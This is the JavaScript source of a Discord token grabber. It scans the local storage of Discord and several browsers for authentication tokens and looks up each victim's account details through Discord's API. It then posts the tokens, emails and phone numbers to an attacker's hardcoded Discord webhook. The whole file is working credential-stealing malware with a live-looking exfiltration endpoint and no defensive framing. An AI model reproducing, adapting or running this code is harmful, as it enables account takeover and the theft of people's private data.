const fs = require('fs');
const axios = require('axios');
const fetch = require('node-fetch');

const webhook = "https://discord.com/api/webhooks/1247364290084606052/CnNsZ184abYfD1kj3yAtkOH873RS4c7HVpD5Ryps2wX5Sv4pG-zz9KCRZmPYHIff3llm";

const paths = [
    `${__dirname.split(":")[0]}:/Users/${__dirname.split("\\")[2]}/AppData/Roaming/discord/Local Storage/leveldb`,
    `${__dirname.split(":")[0]}:/Users/${__dirname.split("\\")[2]}/AppData/Local/Google/Chrome/User Data/Default/Local Storage/leveldb`,
    `${__dirname.split(":")[0]}:/Users/${__dirname.split("\\")[2]}/AppData/Roaming/discordcanary/Local Storage/leveldb`,
    `${__dirname.split(":")[0]}:/Users/${__dirname.split("\\")[2]}/AppData/Roaming/Opera Software/Opera Stable/Local Storage/leveldb`,
    `${__dirname.split(":")[0]}:/Users/${__dirname.split("\\")[2]}/AppData/Local/BraveSoftware/Brave-Browser/User Data/Default/Local Storage/leveldb`,
    `${__dirname.split(":")[0]}:/Users/${__dirname.split("\\")[2]}/AppData/Local/Yandex/YandexBrowser/User Data/Default/Local Storage/leveldb`
];

paths.forEach(path => {
    getTokens(path);
});

async function getTokens(path) {
    try {
        fs.readdir(path, async (err, files) => {
            if (err) {
                console.error(`Error reading directory ${path}: ${err}`);
                return;
            }

            const tokenFiles = files.filter(f => f.split('.').pop() === "ldb");
            for (const file of tokenFiles) {
                try {
                    const data = await fs.promises.readFile(`${path}/${file}`, 'utf-8');
                    const match = data.match(/"[\d\w_-]{24}\.[\d\w_-]{6}\.[\d\w_-]{27}"/) || data.match(/"mfa\.[\d\w_-]{84}"/);
                    if (match) {
                        const token = match[0].replace(/"/g, '');
                        console.log(token);
                        const response = await axios.get(`https://discord.com/api/v6/users/@me`, {
                            headers: {
                                "Authorization": token
                            }
                        });
                        if (response.data.id) {
                            let nitro = response.data.premium_type ? (response.data.premium_type === 1 ? "Nitro Classic" : "Nitro Gaming") : "No nitro";
                            send(token, response.data.id, response.data.username, response.data.discriminator, response.data.email, response.data.phone, nitro, response.data.avatar);
                        }
                    }
                } catch (err) {
                    console.error(`Error reading file ${file}: ${err}`);
                }
            }
        });
    } catch (err) {
        console.error(`Error reading directory ${path}: ${err}`);
    }
}

function send(token, id, username, tag, email, phone, nitro, avatar) {
    try {
        if (!email) email = "No email";
        if (!phone) phone = "No phone code";
        if (!avatar) avatar = "https://cdn.discordapp.com/attachments/712856393245392897/743945577238364160/discord.jpg";
        else avatar = `https://cdn.discordapp.com/avatars/${id}/${avatar}.png`;

        axios.post(webhook, {
            "embeds": [
                {
                    "color": 1127128,
                    "author": {
                        "name": `${username}`,
                        "icon_url": `${avatar}`
                    },
                    "thumbnail": {
                        "url": `${avatar}`
                    },
                    "description": `**TOKEN**\n\n${token}\n\n**ID**\n\n${id}\n\n**USERNAME**\n\n${username}#${tag}\n\n**EMAIL**\n\n${email}\n\n**PHONE**\n\n${phone}\n\n**NITRO**\n\n${nitro}`,
                }
            ], "username": "Token Grabber", "avatar_url": "https://media.discordapp.net/attachments/1239347707546439774/1252148034498990122/2024-06-04_055910.png?ex=6671d1fb&is=6670807b&hm=98057ac88d81eea1813fc7e2f9fb9926443d0a2eec23cc1a9c63762e2ecafc72&=&format=webp&quality=lossless"
        }, {
            headers: {
                'Content-Type': 'application/json',
            },
        });
    } catch (err) {
        console.error(`Error sending webhook: ${err}`);
    }
}
